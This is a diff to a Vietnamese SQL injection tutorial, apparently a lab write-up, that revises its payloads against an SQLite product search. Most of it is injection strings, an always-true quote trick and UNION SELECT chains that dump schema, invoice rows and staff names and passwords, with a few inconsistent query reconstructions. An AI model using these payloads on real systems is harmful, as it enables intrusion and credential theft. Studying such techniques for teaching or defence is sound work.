@@ -19,30 +19,37 @@ Cac bước tấn công như sau:
 ```
 apple
 
-	SELECT ?, ?, ? FROM ? WHERE ? LIKE '%apple%'
+	SELECT ?, ?, ? FROM ? WHERE ? = 'apple'
 
-pp
+orange
 
-	SELECT ?, ?, ? FROM ? WHERE ? LIKE '%pp%'
+	SELECT ?, ?, ? FROM ? WHERE ? = 'orange'
+
+' OR ''='
+
+	SELECT ?, ?, ?
+	FROM ?
+	WHERE name like '' OR ''=''
+
 ```
 
 2. Dựa vào đây, ta có thể chuẩn bị được đòn tấn công đầu tiên. Chỉ cần ta:
 
 - Lấy đúng 3 cột từ mọi bảng dữ liệu.
-- Biến chuỗi `%'` trở nên 1 phép so sánh luôn đúng.
-- Kèm thêm lệnh `UNION`.
+- Dấu `'` sẽ kết thúc query, nên ta có thể chèn thêm ''=' để biến nó này 1 phép so sánh luôn đúng.
+- Kèm thêm hàm `UNION`.
   Ta có thể lấy được mọi dữ liệu trong hệ thống. Dù không biết đây là cơ sở dữ liêu nào, ta vẫn có thử truy cập các bảng chứa schema của từng cơ sở dữ liệu cho đến khi thành công, trong trường hợp này nội dung tìm kiếm sẽ là:
 
 ```
-%' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE '%'='
+' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE ''='
 
 	SELECT ?, ?, ?
 	FROM ?
-	WHERE ? LIKE '%%';
+	WHERE ? LIKE '';
 	UNION
 		SELECT type, tbl_name, sql
 		FROM sqlite_master
-		WHERE '%'='%'
+		WHERE ''=''
 
 ```
 
@@ -51,11 +58,11 @@ Query trên cho phép ta lấy được thông tin schema của tất cả các 
 3. Từ đó, ta có thể tiếp tục lấy dữ liệu từ các bảng còn lại:
 
 ```
-%' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE '%'='
+' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE ''='
 
 	SELECT id, name, description
 	FROM products
-	WHERE name LIKE '%%'
+	WHERE name = ''
 	UNION
 		SELECT type, tbl_name, sql
 		FROM sqlite_master
@@ -63,13 +70,13 @@ Query trên cho phép ta lấy được thông tin schema của tất cả các 
 		UNION
 			SELECT id, total, staff_id
 			FROM invoice
-			WHERE '%'='%'
+			WHERE ''=''
 
-%' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE 1 UNION SELECT id, name, phone FROM staff WHERE '%'='
+' UNION SELECT type, tbl_name, sql FROM sqlite_master WHERE 1 UNION SELECT id, total, staff_id FROM invoice WHERE 1 UNION SELECT id, name, phone FROM staff WHERE ''='
 
 	SELECT id, name, description
 	FROM products
-	WHERE name LIKE '%%'
+	WHERE name LIKE ''
 		UNION
 		SELECT type, tbl_name, sql
 		FROM sqlite_master
@@ -79,8 +86,8 @@ Query trên cho phép ta lấy được thông tin schema của tất cả các 
 			FROM invoice
 			WHERE 1
 			UNION
-				SELECT id, name, phone
+				SELECT id, name, pass
 				FROM staff
-				WHERE '%'='%'
+				WHERE ''=''
 
 ```
